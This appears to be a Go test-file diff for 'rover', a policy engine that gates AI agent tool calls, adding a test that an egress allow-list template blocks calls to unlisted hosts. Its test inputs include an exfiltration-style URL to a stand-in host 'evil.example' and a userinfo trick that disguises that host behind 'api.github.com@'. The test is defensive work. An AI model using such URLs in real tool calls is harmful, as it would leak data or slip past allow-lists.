@@ -6,6 +6,8 @@ import (
 	"strings"
 	"testing"
 
+	"github.com/DreadpiratePickles/rover/internal/ipc"
+	"github.com/DreadpiratePickles/rover/internal/policy/normalize"
 	policyfiles "github.com/DreadpiratePickles/rover/policy"
 )
 
@@ -23,8 +25,8 @@ func TestStarterAndEveryTemplateLoad(t *testing.T) {
 		}
 		files[ent.Name()] = b
 	}
-	if len(files) != 6 {
-		t.Fatalf("want starter + 5 templates, got %d files", len(files))
+	if len(files) != 7 {
+		t.Fatalf("want starter + 6 templates, got %d files", len(files))
 	}
 
 	for name, src := range files {
@@ -143,5 +145,43 @@ func TestStarterCarriesTheTrifectaGuard(t *testing.T) {
 	}
 	if !ids["trifecta-no-egress"] || !ids["trifecta-no-egress-after-detection"] {
 		t.Fatalf("starter policies = %v", e.Policies())
+	}
+}
+
+// M10: the egress allow-list forbids an egress call to any other host, and
+// leaves listed hosts, non-egress tools and calls without a URL alone.
+func TestEgressAllowlistTemplate(t *testing.T) {
+	// Arrange
+	tmpl, err := fs.ReadFile(policyfiles.Templates, "egress-allowlist.cedar")
+	if err != nil {
+		t.Fatal(err)
+	}
+	e := mustLoad(t, `@id("all") permit (principal, action == Action::"call_tool", resource);`+"\n"+string(tmpl))
+	decide := func(labels []string, args string) Outcome {
+		in := input(DirC2S, toolsCall("1", "post", args))
+		in.Labels = map[string][]string{"post": labels}
+		in.Normalizers = normalize.Rules{"url": normalize.KindURL}
+		return e.Decide(in)
+	}
+	egress := []string{"egress"}
+
+	// Act
+	evil := decide(egress, `{"url":"https://evil.example/collect?d=x"}`)
+	userinfo := decide(egress, `{"url":"https://api.github.com@evil.example/"}`)
+	listed := decide(egress, `{"url":"https://API.github.com/repos"}`)
+	notEgress := decide(nil, `{"url":"https://evil.example/"}`)
+	noURL := decide(egress, `{"to":"a@example.com"}`)
+
+	// Assert
+	if evil.Action != ipc.ActionBlock || !contains(evil.RuleIDs, "egress-allowlist") {
+		t.Fatalf("unlisted host: %+v", evil)
+	}
+	if userinfo.Action != ipc.ActionBlock {
+		t.Fatalf("userinfo trick: %+v", userinfo)
+	}
+	for name, o := range map[string]Outcome{"listed": listed, "not egress": notEgress, "no url": noURL} {
+		if o.Action != ipc.ActionForward {
+			t.Errorf("%s: %+v", name, o)
+		}
 	}
 }
